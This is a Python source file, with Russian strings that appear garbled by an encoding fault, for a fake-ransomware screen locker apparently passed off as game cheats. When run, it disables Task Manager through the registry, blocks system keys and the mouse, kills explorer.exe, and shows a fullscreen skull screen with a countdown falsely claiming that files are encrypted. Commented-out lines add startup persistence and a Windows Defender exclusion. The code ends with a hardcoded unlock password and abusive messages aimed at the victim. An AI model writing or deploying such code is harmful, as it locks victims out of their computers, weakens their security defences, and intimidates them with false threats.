import tkinter as tk
from tkinter import messagebox
import pygame
import time
import threading
import math
import keyboard
import pynput
import os
import subprocess
import sys
import shutil
u = os.getlogin
#startup_path = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
#shutil.copy('App.exe', startup_path)
#subprocess.run(["powershell","-Command",f"Add-MpPreference -ExclusionPath '{os.path.join(os.getcwd(),'App.exe').replace("'","''")}'"],shell=True)

#Ğ’ĞĞ˜ĞœĞĞĞ˜Ğ• Ğ­Ğ¢Ğ Ğ’ĞĞ™Ğ‘ĞšĞĞ”Ğ˜ĞĞ“ Ğ§Ğ•Ğ Ğ•Ğ— TKINTER Ğ¿Ñ€Ğ¾ÑÑ‚Ğ¾ ÑƒĞ¶Ğ°Ñ


os.system('reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f')
#Ğ±Ğ»Ğ¾ĞºĞ¸Ñ€ÑƒÑ ĞºĞ»Ğ°Ğ²Ğ¸ÑˆĞ¸ Ğ¸ Ğ¼Ñ‹ÑˆĞºÑƒ
#folder_path = f"C:/{u}\Admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
#try:
#    escaped_path = folder_path.replace("'", "''")
#    ps_command = f"Add-MpPreference -ExclusionPath '{escaped_path}'"
#
#    subprocess.run(["powershell", "-Command", ps_command], shell=True)
#except Exception as e:
#    print(f"âœ— ĞÑˆĞ¸Ğ±ĞºĞ°: {e}")

ey = ('win', 'esc', 'tab', 'shift', 'ctrl', 'del', 'f1', 'f2', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9', 'f10', 'f11', 'f12',)
keyboard.block_key(ey)
#Ğ±Ğ»Ğ¾ĞºĞ¸Ñ€Ğ¾Ğ²ĞºĞ° Ğ¼Ñ‹ÑˆĞ¸
mouse_listener = pynput.mouse.Listener(suppress=True)
mouse_listener.start()
#Ğ£Ğ±Ğ¸Ğ²Ğ°ĞµĞ¼ Ğ¿Ñ€Ğ¾Ñ†ĞµÑÑÑ‹
os.system("taskkill /f /im explorer.exe")

class FullScreenLock:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("Ğ¡Ğ˜Ğ¡Ğ¢Ğ•ĞœĞ Ğ—ĞĞ ĞĞ–Ğ•ĞĞ")

        #Ğ¼ÑƒĞ·Ñ‹ĞºĞ°
        try:
            pygame.mixer.init(frequency=22050, size=-16, channels=2, buffer=512)
            self.music_available = True
        except:
            self.music_available = False
            print("ĞœÑƒĞ·Ñ‹ĞºĞ° Ğ½ĞµĞ´Ğ¾ÑÑ‚ÑƒĞ¿Ğ½Ğ°")

        # Ğ‘Ğ›ĞĞš Ğ“ĞĞ Ğ¯Ğ§Ğ˜Ğ¥ ĞšĞ›ĞĞ’Ğ˜Ğ¨
        self.root.protocol("WM_DELETE_WINDOW", self.prevent_close)
        self.root.bind('<Escape>', self.prevent_close)
        self.root.bind('<Alt-F4>', self.prevent_close)
        self.root.bind('<Control-w>', self.prevent_close)
        self.root.bind('<Control-q>', self.prevent_close)
        self.root.bind('<Alt-Tab>', self.prevent_close)
        self.root.bind('<Super_L>', self.prevent_close)
        self.root.bind('<Super_R>', self.prevent_close)

        self.root.attributes('-fullscreen', True)
        self.root.configure(bg='#1a0000')

        self.root.attributes('-topmost', True)

        self.correct_password = "4445"
        self.attempts = 0
        self.max_attempts = 5
        self.locked = False
        self.music_playing = False
        self.timer_expired = False
        self.alarm_music_playing = False

        self.create_interface()

        # Ğ—Ğ°Ğ¿ÑƒÑĞº Ğ¼ÑƒĞ·Ñ‹ĞºĞ¸
        self.play_alarm_music()

    def prevent_close(self, event=None):
        """ĞŸÑ€ĞµĞ´Ğ¾Ñ‚Ğ²Ñ€Ğ°Ñ‰Ğ°ĞµÑ‚ Ğ·Ğ°ĞºÑ€Ñ‹Ñ‚Ğ¸Ğµ Ğ¾ĞºĞ½Ğ°"""
        return "break"

    def create_interface(self):
        # ĞÑĞ½Ğ¾Ğ²Ğ½Ğ¾Ğ¹ ĞºĞ¾Ğ½Ñ‚ĞµĞ¹Ğ½ĞµÑ€
        main_frame = tk.Frame(self.root, bg='#1a0000')
        main_frame.pack(expand=True, fill='both', padx=50, pady=50)

        # Ğ§ĞµÑ€ĞµĞ¿
        skull_art = """
â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿
â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â ¿â »â ›â ›â »â¢¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿
â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â â „â „â „â „â „â „â ˜â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿
â£¿â£¿â£â¢»â£¿â£¿â£¿â£¿â¡€â¢ â£¶â¡†â¢ â£¶â¡„â¢€â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿
â£¿â£¿â£¿â£¦â »â£¿â£¿â£¿â£‹â¡ˆâ ‰â ¡â â ‰â â£ˆâ£¿â£¿â£¿â£¿â ‹â£¼â£¿â£¿
â£¿â£¿â£¿â£¿â£¦â ™â¢¿â£¿â£¿â¡â¢¦â£€â£€â£ â¢ªâ£¿â£¿â£¿â Ÿâ¢¡â£¾â£¿â£¿â£¿
â£¿â£¿â£¿â£¿â£¿â£·â£„â ™â ¿â£·â£Œâ ‰â ‰â¢â£¾â¡¿â Ÿâ¢â£´â£¿â£¿â£¿â£¿â£¿
â£¿â£¿â£¿â£¿â£¿â¡Ÿâ¢›â£·â£„â¡ˆâ¢™â¡»â ¿â¡Ÿâ ‰â£‚â£´â¡›â¢¿â£¿â£¿â£¿â£¿â£¿
â£¿â£¿â£¿â£¿â£¿â¡”â¡¿â¢Ÿâ£›â¡«â ¥â¢ˆâ£‘â¡ â ­â£›â¡»â¢¿â¢¸â£¿â£¿â£¿â£¿â£¿
â£¿â£„â£ â£„â£ â£†â ©â£½â£¶â£¶â£¿â£¿â£¿â£¿â£·â£¶â¡®â¢â£¤â£€â£„â£„â£„â£¿
â£¿â£¿â£¿â£¿â£¿â£¿â£€â£¼â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£…â£¸â£¿â£¿â£¿â£¿â£¿â£¿
â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿â£¿
        """

        skull_label = tk.Label(
            main_frame,
            text=skull_art,
            fg='#ff0000',
            bg='#1a0000',
            font=('Courier New', 12, 'bold'),
            justify='center'
        )
        skull_label.pack(pady=10)

        # Ğ—Ğ°Ğ³Ğ¾Ğ»Ğ¾Ğ²Ğ¾Ğº
        title_label = tk.Label(
            main_frame,
            text=" Ğ¡Ğ˜Ğ¡Ğ¢Ğ•ĞœĞ Ğ—ĞĞ ĞĞ–Ğ•ĞĞ Ğ’Ğ¡Ğ• Ğ¤ĞĞ™Ğ›Ğ« Ğ—ĞĞ¨Ğ˜Ğ¤Ğ ĞĞ’ĞĞĞ« ",
            fg='#ff0000',
            bg='#1a0000',
            font=('Arial', 26, 'bold'),
            justify='center'
        )
        title_label.pack(pady=10)

        # ĞŸÑ€ĞµĞ´ÑƒĞ¿Ñ€ĞµĞ¶Ğ´Ğ°ÑÑ‰ĞµĞµ ÑĞ¾Ğ¾Ğ±Ñ‰ĞµĞ½Ğ¸Ğµ
        warning_text = """
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘                ĞšĞ Ğ˜Ğ¢Ğ˜Ğ§Ğ•Ğ¡ĞšĞĞ• ĞŸĞ Ğ•Ğ”Ğ£ĞŸĞ Ğ•Ğ–Ğ”Ğ•ĞĞ˜Ğ•                    â•‘
â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£
â•‘  ĞĞ±Ğ½Ğ°Ñ€ÑƒĞ¶ĞµĞ½: Ğ¢ÑƒĞ¿Ğ¾Ğ¹ ÑˆĞºĞ¾Ğ»ÑŒĞ½Ğ¸Ğº ĞºĞ¾Ñ‚Ğ¾Ñ€Ñ‹Ğ¹ Ñ…Ğ¾Ñ‚ĞµĞ» Ñ‡Ğ¸Ñ‚Ğ¸ĞºĞ¸              â•‘
â•‘  Ğ’ÑĞµ Ñ„Ğ°Ğ¹Ğ»Ñ‹ Ğ·Ğ°ÑˆĞ¸Ñ„Ñ€Ğ¾Ğ²Ğ°Ğ½Ñ‹. Ğ”Ğ¾ÑÑ‚ÑƒĞ¿ Ğ¾Ğ³Ñ€Ğ°Ğ½Ğ¸Ñ‡ĞµĞ½.                    â•‘
â•‘  Ğ”Ğ»Ñ Ğ²Ğ¾ÑÑÑ‚Ğ°Ğ½Ğ¾Ğ²Ğ»ĞµĞ½Ğ¸Ñ Ğ¿Ğ¾Ğ´Ğ¿Ğ¸ÑˆĞ¸Ñ‚ĞµÑÑŒ Ğ½Ğ° Ğ¢Ğ“Ğš nitri4k               â•‘
â•‘  Ğ’Ñ€ĞµĞ¼Ñ Ğ¾Ğ³Ñ€Ğ°Ğ½Ğ¸Ñ‡ĞµĞ½Ğ¾! Ğ¢Ğ°Ğ¹Ğ¼ĞµÑ€: 15 Ğ¼Ğ¸Ğ½ÑƒÑ‚!                         â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        """

        warning_label = tk.Label(
            main_frame,
            text=warning_text,
            fg='#ff4444',
            bg='#1a0000',
            font=('Courier New', 10, 'bold'),
            justify='center'
        )
        warning_label.pack(pady=20)

        # Ğ¤Ñ€ĞµĞ¹Ğ¼ Ğ´Ğ»Ñ Ğ²Ğ²Ğ¾Ğ´Ğ° Ğ¿Ğ°Ñ€Ğ¾Ğ»Ñ
        self.password_frame = tk.Frame(main_frame, bg='#1a0000')
        self.password_frame.pack(pady=30)

        tk.Label(
            self.password_frame,
            text="Ğ’Ğ’Ğ•Ğ”Ğ˜Ğ¢Ğ• ĞšĞĞ” Ğ ĞĞ—Ğ‘Ğ›ĞĞšĞ˜Ğ ĞĞ’ĞšĞ˜:",
            fg='#ff6666',
            bg='#1a0000',
            font=('Arial', 12, 'bold')
        ).pack(pady=5)

        self.password_entry = tk.Entry(
            self.password_frame,
            show='â€¢',
            font=('Arial', 18, 'bold'),
            width=15,
            justify='center',
            bg='#330000',
            fg='#ff0000',
            insertbackground='red',
            relief='solid',
            bd=3
        )
        self.password_entry.pack(pady=10)
        self.password_entry.bind('<Return>', self.check_password)
        self.password_entry.focus()

        # ĞšĞ½Ğ¾Ğ¿ĞºĞ° Ğ¿Ñ€Ğ¾Ğ²ĞµÑ€ĞºĞ¸ Ğ¿Ğ°Ñ€Ğ¾Ğ»Ñ (Ğ±ÑƒĞ´ĞµÑ‚ ÑƒĞ´Ğ°Ğ»ĞµĞ½Ğ° Ğ¿Ğ¾ Ñ‚Ğ°Ğ¹Ğ¼ĞµÑ€Ñƒ)
        self.submit_btn = tk.Button(
            self.password_frame,
            text=" Ğ ĞĞ—Ğ‘Ğ›ĞĞšĞ˜Ğ ĞĞ’ĞĞ¢Ğ¬ Ğ¡Ğ˜Ğ¡Ğ¢Ğ•ĞœĞ£ ",
            command=self.check_password,
            bg='#990000',
            fg='white',
            font=('Arial', 12, 'bold'),
            padx=30,
            pady=15,
            relief='raised',
            bd=5,
            activebackground='#cc0000',
            activeforeground='white'
        )
        self.submit_btn.pack(pady=15)

        # Ğ¡Ñ‡ĞµÑ‚Ñ‡Ğ¸Ğº Ğ¿Ğ¾Ğ¿Ñ‹Ñ‚Ğ¾Ğº
        self.attempts_label = tk.Label(
            main_frame,
            text=f" ĞŸĞĞŸĞ«Ğ¢ĞĞš: {self.attempts}/{self.max_attempts}",
            fg='#ffaa00',
            bg='#1a0000',
            font=('Arial', 11, 'bold')
        )
        self.attempts_label.pack(pady=10)

        self.timer_label = tk.Label(
            main_frame,
            text=" Ğ”Ğ Ğ£ĞĞ˜Ğ§Ğ¢ĞĞ–Ğ•ĞĞ˜Ğ¯ Ğ”ĞĞĞĞ«Ğ¥: 15:00",
            fg='#ff0000',
            bg='#1a0000',
            font=('Arial', 14, 'bold')
        )
        self.timer_label.pack(pady=5)

        self.status_label = tk.Label(
            main_frame,
            text="Ğ¡Ğ˜Ğ¡Ğ¢Ğ•ĞœĞĞ«Ğ• ĞšĞĞœĞ‘Ğ˜ĞĞĞ¦Ğ˜Ğ˜ Ğ‘Ğ›ĞĞšĞ˜Ğ ĞĞ’ĞĞĞ« Ğ’Ğ˜ĞĞ”Ğ Ğ£Ğ”ĞĞ›Ğ˜Ğ¢Ğ¡Ğ¯ Ğ•Ğ¡Ğ›Ğ˜ Ğ—ĞĞ™Ğ¢Ğ˜ Ğ’ Ğ‘Ğ•Ğ—ĞĞŸĞĞ¡Ğ«ĞĞ™ Ğ Ğ•Ğ–Ğ˜Ğœ",
            fg='#00ff00',
            bg='#1a0000',
            font=('Arial', 10, 'bold')
        )
        self.status_label.pack(pady=5)

        # ĞšÑ€Ğ¸Ñ‚Ğ¸Ñ‡ĞµÑĞºĞ¾Ğµ Ğ¿Ñ€ĞµĞ´ÑƒĞ¿Ñ€ĞµĞ¶Ğ´ĞµĞ½Ğ¸Ğµ
        critical_warning = tk.Label(
            main_frame,
            text=" Ğ’ĞĞ˜ĞœĞĞĞ˜Ğ•: 5 ĞĞ•Ğ£Ğ”ĞĞ§ĞĞ«Ğ¥ ĞŸĞĞŸĞ«Ğ¢ĞĞš Ğ˜Ğ›Ğ˜ Ğ˜Ğ¡Ğ¢Ğ•Ğ§Ğ•ĞĞ˜Ğ• Ğ’Ğ Ğ•ĞœĞ•ĞĞ˜ ĞŸĞ Ğ˜Ğ’Ğ•Ğ”Ğ£Ğ¢ Ğš Ğ‘Ğ›ĞĞšĞ˜Ğ ĞĞ’ĞšĞ•!",
            fg='#ff0000',
            bg='#1a0000',
            font=('Arial', 10, 'bold')
        )
        critical_warning.pack(side='bottom', pady=20)

        # Ğ—Ğ°Ğ¿ÑƒÑĞºĞ°ĞµĞ¼ Ñ‚Ğ°Ğ¹Ğ¼ĞµÑ€
        self.start_timer()

    def start_timer(self):
        """Ğ—Ğ°Ğ¿ÑƒÑĞºĞ°ĞµÑ‚ Ğ¾Ğ±Ñ€Ğ°Ñ‚Ğ½Ñ‹Ğ¹ Ğ¾Ñ‚ÑÑ‡ĞµÑ‚ 15 Ğ¼Ğ¸Ğ½ÑƒÑ‚"""
        self.time_left = 900  # 15 Ğ¼Ğ¸Ğ½ÑƒÑ‚ Ğ² ÑĞµĞºÑƒĞ½Ğ´Ğ°Ñ…
        self.update_timer()

    def update_timer(self):
        """ĞĞ±Ğ½Ğ¾Ğ²Ğ»ÑĞµÑ‚ Ñ‚Ğ°Ğ¹Ğ¼ĞµÑ€"""
        if self.time_left > 0:
            minutes = self.time_left // 60
            seconds = self.time_left % 60
            self.timer_label.config(text=f" Ğ”Ğ Ğ£ĞĞ˜Ğ§Ğ¢ĞĞ–Ğ•ĞĞ˜Ğ¯ Ğ”ĞĞĞĞ«Ğ¥: {minutes:02d}:{seconds:02d}")
            self.time_left -= 1
            self.root.after(1000, self.update_timer)
        else:
            self.timer_expired = True
            self.timer_label.config(text=" Ğ’Ğ Ğ•ĞœĞ¯ Ğ’Ğ«Ğ¨Ğ›Ğ! Ğ¡Ğ˜Ğ¡Ğ¢Ğ•ĞœĞ Ğ—ĞĞ‘Ğ›ĞĞšĞ˜Ğ ĞĞ’ĞĞĞ!")
            self.remove_unlock_button()

    def remove_unlock_button(self):
        """Ğ£Ğ´Ğ°Ğ»ÑĞµÑ‚ ĞºĞ½Ğ¾Ğ¿ĞºÑƒ Ñ€Ğ°Ğ·Ğ±Ğ»Ğ¾ĞºĞ¸Ñ€Ğ¾Ğ²ĞºĞ¸ Ğ¿Ğ¾ÑĞ»Ğµ Ñ‚Ğ°Ğ¹Ğ¼ĞµÑ€Ğ°"""
        if hasattr(self, 'submit_btn') and self.submit_btn:
            self.submit_btn.pack_forget()  # Ğ£Ğ±Ğ¸Ñ€Ğ°ĞµĞ¼ ĞºĞ½Ğ¾Ğ¿ĞºÑƒ
            self.password_entry.config(state='disabled', bg='#550000')  # ĞÑ‚ĞºĞ»ÑÑ‡Ğ°ĞµĞ¼ Ğ¿Ğ¾Ğ»Ğµ Ğ²Ğ²Ğ¾Ğ´Ğ°
            self.status_label.config(text=" Ğ’Ğ Ğ•ĞœĞ¯ Ğ’Ğ«Ğ¨Ğ›Ğ! Ğ¡Ğ˜Ğ¡Ğ¢Ğ•ĞœĞ Ğ—ĞĞ‘Ğ›ĞĞšĞ˜Ğ ĞĞ’ĞĞĞ ĞĞĞ’Ğ¡Ğ•Ğ“Ğ”Ğ!", fg='#ff0000')
            self.start_alarm_chords()

            #Ğ‘Ğ»Ğ¾ĞºĞ¸Ñ€Ğ¾Ğ²ĞºĞ° ÑĞ¼Ñ
            messagebox.showerror(
                "Ğ’Ğ Ğ•ĞœĞ¯ Ğ’Ğ«Ğ¨Ğ›Ğ!",
                " Ğ¢ĞĞ™ĞœĞ•Ğ  Ğ˜Ğ¡Ğ¢Ğ•Ğš!\n\n"
                "Ğ¡Ğ¸ÑÑ‚ĞµĞ¼Ğ° Ğ·Ğ°Ğ±Ğ»Ğ¾ĞºĞ¸Ñ€Ğ¾Ğ²Ğ°Ğ½Ğ° Ğ½Ğ°Ğ²ÑĞµĞ³Ğ´Ğ°!\n"
                "Ğ’Ğ¾Ğ·Ğ¼Ğ¾Ğ¶Ğ½Ğ¾ÑÑ‚ÑŒ Ñ€Ğ°Ğ·Ğ±Ğ»Ğ¾ĞºĞ¸Ñ€Ğ¾Ğ²ĞºĞ¸ ÑƒÑ‚Ñ€Ğ°Ñ‡ĞµĞ½Ğ°!\n\n"
                "ĞŸĞ¸Ğ·Ğ´Ğ° Ñ‚Ğ²Ğ¾ĞµĞ¼Ñƒ ĞºĞ¾Ğ¼Ğ¿Ñƒ, Ñ‰ĞµĞ½Ğ¾Ğº"
            )

    def generate_chord(self, frequencies, duration=1.0):
        """Ğ“ĞµĞ½ĞµÑ€Ğ¸Ñ€ÑƒĞµÑ‚ Ğ°ĞºĞºĞ¾Ñ€Ğ´ Ğ¸Ğ· Ğ½ĞµÑĞºĞ¾Ğ»ÑŒĞºĞ¸Ñ… Ñ‡Ğ°ÑÑ‚Ğ¾Ñ‚"""
        sample_rate = 22050
        n_samples = int(duration * sample_rate)
        samples = bytearray()

        for i in range(n_samples):
            sample = 0
            for freq in frequencies:
                sample += 0.2 * math.sin(2 * math.pi * freq * i / sample_rate)
            samples.append(int(sample * 127 + 128))

        return pygame.mixer.Sound(buffer=bytes(samples))

    def start_alarm_chords(self):
        """Ğ—Ğ°Ğ¿ÑƒÑĞºĞ°ĞµÑ‚ Ñ‚Ñ€ĞµĞ²Ğ¾Ğ¶Ğ½Ñ‹Ğµ Ğ°ĞºĞºĞ¾Ñ€Ğ´Ñ‹ Ğ¿Ğ¾ÑĞ»Ğµ Ğ±Ğ»Ğ¾ĞºĞ¸Ñ€Ğ¾Ğ²ĞºĞ¸"""
        if not self.alarm_music_playing and self.music_available:
            self.alarm_music_playing = True

            def play_chords():
                print("ğŸµ ĞĞšĞšĞĞ Ğ”Ğ«: Ğ˜Ğ³Ñ€Ğ°ÑÑ‚ Ñ‚Ñ€ĞµĞ²Ğ¾Ğ¶Ğ½Ñ‹Ğµ Ğ°ĞºĞºĞ¾Ñ€Ğ´Ñ‹...")

                #ĞœÑƒĞ·Ñ‹ĞºĞ°
                chords = [
                    [330, 392, 494],  # ĞœĞ¸Ğ½Ğ¾Ñ€Ğ½Ñ‹Ğ¹ Ğ°ĞºĞºĞ¾Ñ€Ğ´
                    [349, 440, 523],  # Ğ•Ñ‰Ğµ Ğ¾Ğ´Ğ¸Ğ½ Ğ¼Ğ¸Ğ½Ğ¾Ñ€
                    [311, 370, 466],  # ĞŸĞ¾Ğ½Ğ¸Ğ¶ĞµĞ½Ğ½Ñ‹Ğµ Ñ‡Ğ°ÑÑ‚Ğ¾Ñ‚Ñ‹
                    [392, 494, 587]  # ĞŸĞ¾Ğ²Ñ‹ÑˆĞµĞ½Ğ½Ñ‹Ğµ Ñ‡Ğ°ÑÑ‚Ğ¾Ñ‚Ñ‹
                ]

                while self.alarm_music_playing:
                    for chord in chords:
                        if not self.alarm_music_playing:
                            break
                        try:
                            chord_sound = self.generate_chord(chord, 1.5)
                            chord_sound.play()
                            time.sleep(0.5)  # ĞŸĞ°ÑƒĞ·Ğ° Ğ¼ĞµĞ¶Ğ´Ñƒ Ğ°ĞºĞºĞ¾Ñ€Ğ´Ğ°Ğ¼Ğ¸
                        except Exception as e:
                            print(f"ĞÑˆĞ¸Ğ±ĞºĞ° Ğ²Ğ¾ÑĞ¿Ñ€Ğ¾Ğ¸Ğ·Ğ²ĞµĞ´ĞµĞ½Ğ¸Ñ Ğ°ĞºĞºĞ¾Ñ€Ğ´Ğ°: {e}")
                            break

            chord_thread = threading.Thread(target=play_chords)
            chord_thread.daemon = True
            chord_thread.start()
            print("ğŸµ Ğ—Ğ°Ğ¿ÑƒÑ‰ĞµĞ½Ñ‹ Ñ‚Ñ€ĞµĞ²Ğ¾Ğ¶Ğ½Ñ‹Ğµ Ğ°ĞºĞºĞ¾Ñ€Ğ´Ñ‹!")

    def generate_beep_sound(self, frequency=440, duration=1000, volume=0.5):
        """Ğ“ĞµĞ½ĞµÑ€Ğ¸Ñ€ÑƒĞµÑ‚ Ğ¿Ñ€Ğ¾ÑÑ‚Ğ¾Ğ¹ Ğ·Ğ²ÑƒĞºĞ¾Ğ²Ğ¾Ğ¹ ÑĞ¸Ğ³Ğ½Ğ°Ğ»"""
        sample_rate = 22050
        n_samples = int(sample_rate * duration / 1000.0)
        buf = bytearray()

        for i in range(n_samples):
            sample = volume * math.sin(2 * math.pi * frequency * i / sample_rate)
            buf.extend([int(sample * 127 + 128)])

        return bytes(buf)

    def play_alarm_music(self):
        """Ğ’Ğ¾ÑĞ¿Ñ€Ğ¾Ğ¸Ğ·Ğ²Ğ¾Ğ´Ğ¸Ñ‚ Ñ‚Ñ€ĞµĞ²Ğ¾Ğ¶Ğ½ÑƒÑ Ğ¼ÑƒĞ·Ñ‹ĞºÑƒ Ñ Ğ½Ğ°Ñ‡Ğ°Ğ»Ğ° Ğ·Ğ°Ğ¿ÑƒÑĞºĞ°"""

        def music_loop():
            try:
                while self.music_playing and self.music_available:
                    frequencies = [330, 392, 262, 294, 349, 440]  # Ğ¢Ñ€ĞµĞ²Ğ¾Ğ¶Ğ½Ñ‹Ğµ Ğ°ĞºĞºĞ¾Ñ€Ğ´Ñ‹
                    for freq in frequencies:
                        if not self.music_playing:
                            break
                        sound_data = self.generate_beep_sound(freq, 400, 0.4)
                        sound = pygame.mixer.Sound(buffer=sound_data)
                        sound.play()
                        time.sleep(0.5)
            except Exception as e:
                print(f"ĞÑˆĞ¸Ğ±ĞºĞ° Ğ²Ğ¾ÑĞ¿Ñ€Ğ¾Ğ¸Ğ·Ğ²ĞµĞ´ĞµĞ½Ğ¸Ñ: {e}")

        if self.music_available and not self.music_playing:
            self.music_playing = True
            music_thread = threading.Thread(target=music_loop)
            music_thread.daemon = True
            music_thread.start()

    def lock_system(self):
        """Ğ‘Ğ»Ğ¾ĞºĞ¸Ñ€ÑƒĞµÑ‚ ÑĞ¸ÑÑ‚ĞµĞ¼Ñƒ Ğ¿Ğ¾ÑĞ»Ğµ Ğ¿Ñ€ĞµĞ²Ñ‹ÑˆĞµĞ½Ğ¸Ñ Ğ»Ğ¸Ğ¼Ğ¸Ñ‚Ğ° Ğ¿Ğ¾Ğ¿Ñ‹Ñ‚Ğ¾Ğº"""
        if not self.locked:
            self.locked = True

            self.password_entry.config(state='disabled', bg='#550000')
            self.submit_btn.config(state='disabled', bg='#550000')
            self.status_label.config(text=" Ğ¡Ğ˜Ğ¡Ğ¢Ğ•ĞœĞ Ğ—ĞĞ‘Ğ›ĞĞšĞ˜Ğ ĞĞ’ĞĞĞ - ĞŸĞ Ğ•Ğ’Ğ«Ğ¨Ğ•Ğ Ğ›Ğ˜ĞœĞ˜Ğ¢ ĞŸĞĞŸĞ«Ğ¢ĞĞš!", fg='#ff0000')

            self.music_playing = False

            self.start_alarm_chords()

            messagebox.showerror(
                "Ğ¡Ğ˜Ğ¡Ğ¢Ğ•ĞœĞ Ğ—ĞĞ‘Ğ›ĞĞšĞ˜Ğ ĞĞ’ĞĞĞ",
                " ĞŸĞ Ğ•Ğ’Ğ«Ğ¨Ğ•Ğ Ğ›Ğ˜ĞœĞ˜Ğ¢ ĞŸĞĞŸĞ«Ğ¢ĞĞš!\n\n"
                "Ğ¡Ğ¸ÑÑ‚ĞµĞ¼Ğ° Ğ·Ğ°Ğ±Ğ»Ğ¾ĞºĞ¸Ñ€Ğ¾Ğ²Ğ°Ğ½Ğ° Ğ½Ğ°Ğ²ÑĞµĞ³Ğ´Ğ°!\n"
                "ĞĞºÑ‚Ğ¸Ğ²Ğ¸Ñ€Ğ¾Ğ²Ğ°Ğ½ Ğ¿Ñ€Ğ¾Ñ‚Ğ¾ĞºĞ¾Ğ» ÑƒĞ½Ğ¸Ñ‡Ñ‚Ğ¾Ğ¶ĞµĞ½Ğ¸Ñ Ğ´Ğ°Ğ½Ğ½Ñ‹Ñ…...\n\n"
                "Ğ—Ğ°Ğ¿ÑƒÑ‰ĞµĞ½Ñ‹ Ñ‚Ñ€ĞµĞ²Ğ¾Ğ¶Ğ½Ñ‹Ğµ Ğ°ĞºĞºĞ¾Ñ€Ğ´Ñ‹!"
            )

    def check_password(self, event=None):
        """ĞŸÑ€Ğ¾Ğ²ĞµÑ€ÑĞµÑ‚ Ğ²Ğ²ĞµĞ´ĞµĞ½Ğ½Ñ‹Ğ¹ Ğ¿Ğ°Ñ€Ğ¾Ğ»ÑŒ"""
        if self.locked or self.timer_expired:
            return

        entered_password = self.password_entry.get()

        if entered_password == self.correct_password:

            # Ğ’Ğ²ĞµĞ» Ğ¿Ğ°Ñ€Ğ¾Ğ»ÑŒ
            self.music_playing = False
            self.alarm_music_playing = False
            if self.music_available:
                pygame.mixer.stop()
            messagebox.showinfo(
                "Ğ¡Ğ¸ÑÑ‚ĞµĞ¼Ğ° Ğ²Ğ¾ÑÑÑ‚Ğ°Ğ½Ğ¾Ğ²Ğ»ĞµĞ½Ğ° ",
                "Ğ¡ĞºĞ°Ñ‡Ğ°Ğ» ÑĞ²Ğ¾Ñ Ñ…ÑƒĞ¹Ğ½Ñ? Ğ©ĞµĞ½Ğ¾Ğº.\n\n"
                "Ğ¥Ğ£Ğ¯ Ğ¡ĞšĞĞ–Ğ˜ Ğ¡ĞŸĞĞ¡Ğ˜Ğ‘Ğ Ğ§Ğ¢Ğ Ğ­Ğ¢Ğ ĞĞ• ĞšĞ Ğ˜ĞŸĞ¢Ğ•Ğ .\n"
                "ĞĞ°Ğ¶Ğ¼Ğ¸Ñ‚Ğµ Enter Ğ´Ğ»Ñ Ñ€Ğ°Ğ·Ğ±Ğ»Ğ¾ĞºĞ¸Ñ€Ğ¾Ğ²ĞºĞ¸"
            ) #Ñ‚ÑƒÑ‚ Ğ¿Ğ¸ÑĞ°Ñ‚ÑŒ Ñ‡Ñ‚Ğ¾ Ğ¾Ñ‚ĞºÑ€Ñ‹Ñ‚ÑŒ Ğ¿Ğ¾ÑĞ»Ğµ Ğ²Ğ²Ğ¾Ğ´Ğ° Ğ¿Ğ°Ñ€Ğ¾Ğ»Ñ
            os.system('REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 0 /f')
            os.system('start explorer.exe')
            self.root.quit()
            return


        self.attempts += 1
        self.attempts_label.config(text=f" ĞŸĞĞŸĞ«Ğ¢ĞĞš: {self.attempts}/{self.max_attempts}")

        if self.attempts >= self.max_attempts:
            self.lock_system()
        else:
            messagebox.showerror(
                "ĞĞ•Ğ’Ğ•Ğ ĞĞ«Ğ™ ĞšĞĞ”",
                f" ĞšĞĞ” ĞĞ¢ĞšĞ›ĞĞĞ•Ğ!\n\n"
                f"ĞÑÑ‚Ğ°Ğ»Ğ¾ÑÑŒ Ğ¿Ğ¾Ğ¿Ñ‹Ñ‚Ğ¾Ğº: {self.max_attempts - self.attempts}\n\n"
                f""
            )

        self.password_entry.delete(0, tk.END)
        self.password_entry.focus()

    def run(self):
        """Ğ—Ğ°Ğ¿ÑƒÑĞºĞ°ĞµÑ‚ Ğ¿Ñ€Ğ¸Ğ»Ğ¾Ğ¶ĞµĞ½Ğ¸Ğµ"""
        try:
            self.root.mainloop()
        except KeyboardInterrupt:
            print("\nĞŸÑ€Ğ¾Ğ³Ñ€Ğ°Ğ¼Ğ¼Ğ° Ğ¿Ñ€ĞµÑ€Ğ²Ğ°Ğ½Ğ° Ğ¿Ğ¾Ğ»ÑŒĞ·Ğ¾Ğ²Ğ°Ñ‚ĞµĞ»ĞµĞ¼")
            self.music_playing = False
            self.alarm_music_playing = False
